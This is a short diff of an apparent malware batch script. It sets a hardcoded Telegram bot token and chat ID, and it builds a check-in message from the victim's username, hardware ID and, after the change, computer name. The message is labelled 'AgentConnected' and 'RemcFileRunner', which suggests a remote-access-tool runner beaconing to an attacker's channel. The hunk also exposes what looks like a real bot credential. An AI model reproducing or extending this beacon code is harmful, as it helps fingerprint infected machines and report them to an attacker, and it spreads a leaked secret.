@@ -39,7 +39,7 @@ for /f %%i in ('powershell -Command "(Get-WmiObject -Class Win32_ComputerSystemP
 :: Set bot token, chat ID, and message
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "MESSAGE=%USERNAME%|AgentConnected|%HWID%|RemcFileRunner|"
+set "MESSAGE=%USERNAME%(%COMPUTERNAME%)|AgentConnected|%HWID%|RemcFileRunner|"
 
 
 
